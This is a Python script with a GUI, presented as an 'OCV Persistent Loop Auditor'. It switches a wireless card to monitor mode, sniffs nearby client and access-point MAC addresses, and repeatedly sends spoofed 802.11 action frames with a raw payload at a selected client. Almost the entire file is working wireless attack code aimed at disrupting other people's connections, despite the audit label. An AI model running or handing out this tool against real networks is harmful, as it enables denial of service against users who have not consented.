import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class OCVLoopAuditor:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}
        self.running = True
        self.firing = False
        
        # Hard Reset and Monitor Lock
        self.setup_monitor_lock()
        
        self.root = tk.Tk()
        self.root.title("OCV Persistent Loop")
        self.root.geometry("850x650")
        self.root.configure(bg="#050505")

        tk.Label(self.root, text="OCV PERSISTENT LOOP AUDITOR", fg="#00FF41", bg="#050505", font=("Courier", 14)).pack(pady=10)
        
        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", selectmode="single", font=("Courier", 10))
        self.listbox.pack(padx=20, pady=10, fill="both", expand=True)

        self.btn_text = tk.StringVar(value="ENGAGE LOOP")
        tk.Button(self.root, textvariable=self.btn_text, command=self.toggle_loop, bg="#aa5500", fg="white", height=2).pack(pady=5)
        
        tk.Button(self.root, text="REPAIR & EXIT", command=self.shutdown, bg="#333", fg="red").pack(pady=10)

        threading.Thread(target=self.scanner, daemon=True).start()

    def setup_monitor_lock(self):
        # Logic: Kill everything that might flip the mode back to 'Managed'
        print("[*] Killing interference and locking Monitor Mode...")
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def scanner(self):
        def callback(pkt):
            if not self.firing and pkt.haslayer(Dot11) and pkt.addr2 and pkt.addr3:
                if pkt.addr2 != pkt.addr3 and pkt.addr2 not in self.discovered:
                    self.discovered[pkt.addr2] = pkt.addr3
                    self.root.after(0, lambda: self.listbox.insert(tk.END, f"Target: {pkt.addr2} | AP: {pkt.addr3}"))
        sniff(iface=self.iface, prn=callback, store=0)

    def toggle_loop(self):
        if not self.firing:
            self.firing = True
            self.btn_text.set("STOP LOOP")
            threading.Thread(target=self.fire_loop_logic, daemon=True).start()
        else:
            self.firing = False
            self.btn_text.set("ENGAGE LOOP")

    def fire_loop_logic(self):
        selection = self.listbox.curselection()
        if not selection: 
            self.firing = False
            return
        
        target = list(self.discovered.keys())[selection[0]]
        bssid = self.discovered[target]
        
        # Manual Hex logic to bypass AttributeError
        base = RadioTap()/Dot11(addr1=target, addr2=bssid, addr3=bssid)
        pkt = base/Dot11Action()/Raw(load=b"\x0a\x04\xff\x0a\x01\x01")
        
        print(f"[*] Starting OCV Loop on {target}...")
        while self.firing:
            try:
                sendp(pkt, iface=self.iface, count=10, inter=0.01, verbose=False)
                # Logic: Brief sleep to keep the system from thinking the card crashed
                time.sleep(0.05) 
            except Exception as e:
                print(f"[!] Firing Error: {e}")
                break

    def shutdown(self):
        self.running = False
        self.firing = False
        print("[*] Restoring managed mode...")
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up")
        os.system("sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 ocv_loop.py [iface]")
    else: OCVLoopAuditor(sys.argv[1]).root.mainloop()
